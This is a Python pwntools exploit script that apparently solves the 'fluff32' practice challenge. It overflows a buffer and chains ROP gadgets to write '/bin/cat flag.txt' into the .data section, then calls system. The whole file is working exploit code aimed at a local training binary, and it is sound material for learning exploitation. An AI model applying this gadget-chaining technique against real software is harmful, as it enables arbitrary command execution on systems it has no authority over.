#!/usr/bin/python
from pwn import *
import struct

# 25 0x00001028     8 0x0804a028     8 --rw- .data

# 0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret; 
# 0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret; 
# 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
# 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
# 0x080483e1: pop ebx; ret; 

elf = ELF('fluff32')

command = [
    '/bin',
    '/cat',
    ' fla',
    'g.tx',
    't\x00\x00\x00'
]

pad = 'A'*44
ropchain = ''

for x in range(5):
    ropchain += struct.pack('<L', 0x080483e1) # 0x080483e1: pop ebx; ret;
    ropchain += struct.pack('<L', 0x0804a028+(x*4)) # 25 0x00001028     8 0x0804a028     8 --rw- .data
    ropchain += struct.pack('<L', 0x08048671) # 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
    ropchain += struct.pack('<L', 0x0)        # POP Filler
    ropchain += struct.pack('<L', 0x0804867b) # 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
    ropchain += struct.pack('<L', 0x0)        # POP Filler
    ropchain += struct.pack('<L', 0x08048689) # 0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
    ropchain += struct.pack('<L', 0x0)        # POP Filler
    ropchain += struct.pack('<L', 0x080483e1) # 0x080483e1: pop ebx; ret;
    ropchain += command[x]                    # Our Command in 4 byte sections
    ropchain += struct.pack('<L', 0x08048671) # 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
    ropchain += struct.pack('<L', 0x0)        # POP Filler
    ropchain += struct.pack('<L', 0x0804867b) # 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
    ropchain += struct.pack('<L', 0x0)        # POP Filler
    ropchain += struct.pack('<L', 0x08048693) # 0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret; 
    ropchain += struct.pack('<L', 0x0)        # POP Filler
    ropchain += struct.pack('<L', 0x0)        # POP Filler
ropchain += struct.pack('<L', 0x08048430)     # <System@plt>
ropchain += struct.pack('<L', 0x0804a028+9)   # 25 0x00001028     8 0x0804a028+9   8 --rw- .data+0x9 (flag.txt address)
ropchain += struct.pack('<L', 0x0804a028)     # 25 0x00001028     8 0x0804a028     8 --rw- .data (/bin/cat address)
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
